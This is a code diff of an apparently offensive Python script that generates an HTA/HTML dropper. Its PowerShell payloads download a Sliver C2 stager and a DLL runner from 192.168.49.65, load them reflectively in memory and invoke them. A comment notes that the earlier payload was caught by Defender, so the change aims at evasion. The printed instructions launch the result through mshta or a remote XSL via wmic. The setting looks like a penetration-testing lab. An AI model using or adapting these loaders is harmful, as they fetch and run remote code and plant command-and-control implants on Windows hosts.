@@ -1,7 +1,7 @@
 PAYLOAD = """powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/win_msf_sliver_stager.exe')\\";$assem = [System.Reflection.Assembly]::Load($data);[SliverStager.Stager]::Main()"""
 
-## Raw payload gets detected by defender:
-##PAYLOAD = "powershell.exe -c \"(New-Object System.Net.WebClient).DownloadString('http://192.168.49.65/run.txt')\""
+# DLL Runner
+PAYLOAD = """cmd.exe /c powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/DLL-Runner-x64.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('LeMans.Class1');$method = $class.GetMethod('ferrari');$method.Invoke(0, $null)\\" """
 
 TEMPLATE = f"""
        <html>
@@ -21,5 +21,5 @@ TEMPLATE = f"""
 
 print(TEMPLATE)
 
-print('Run with: wmic process get brief /format:"http://192.168.49.65/test.xsl"')
-print('Or run locally')
+print('Run with: mshta http://192.168.49.65/foo.hta')
+print('Or dl and run locally')
